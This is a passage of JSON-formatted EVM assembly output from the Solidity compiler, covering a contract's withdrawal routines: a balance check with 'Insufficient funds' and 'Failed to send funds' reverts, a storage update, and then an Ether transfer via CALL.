											"begin": 2983,
											"end": 3053,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "496E73756666696369656E742066756E64730000000000000000000000000000"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "tag",
											"source": 0,
											"value": "37"
										},
										{
											"begin": 2983,
											"end": 3053,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 3137,
											"end": 3144,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3120,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3121,
											"end": 3131,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3132,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3136,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "36"
										},
										{
											"begin": 3112,
											"end": 3136,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "tag",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 3112,
											"end": 3145,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3097,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3098,
											"end": 3108,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3089,
											"end": 3109,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3145,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3145,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3145,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 3089,
											"end": 3145,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3157,
											"end": 3166,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3172,
											"end": 3182,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3187,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3172,
											"end": 3187,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3195,
											"end": 3202,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3172,
											"end": 3207,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "41"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"source": -1,
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT",
											"source": -1
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"source": -1,
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND",
											"source": -1
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"source": -1,
											"value": "41"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"source": -1,
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 3156,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3156,
											"end": 3207,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3156,
											"end": 3207,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3226,
											"end": 3230,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "42"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "4661696C656420746F2073656E642066756E6473000000000000000000000000"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "tag",
											"source": 0,
											"value": "42"
										},
										{
											"begin": 3218,
											"end": 3255,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 3374,
											"end": 3654,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3415,
											"end": 3426,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3429,
											"end": 3437,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3438,
											"end": 3448,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 3429,
											"end": 3449,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 3415,
											"end": 3449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3415,
											"end": 3449,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3478,
											"end": 3479,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3469,
											"end": 3475,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3469,
											"end": 3479,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "496E73756666696369656E742066756E64730000000000000000000000000000"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "tag",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 3460,
											"end": 3502,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 3536,
											"end": 3537,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3513,
											"end": 3521,
											"name": "PUSH",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3522,
											"end": 3532,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3537,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3537,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3537,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 3513,
											"end": 3537,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3549,
											"end": 3558,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3564,
											"end": 3574,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3579,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3564,
											"end": 3579,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 3587,
											"end": 3593,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 3564,
											"end": 3598,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 3564,
											"end": 3598,
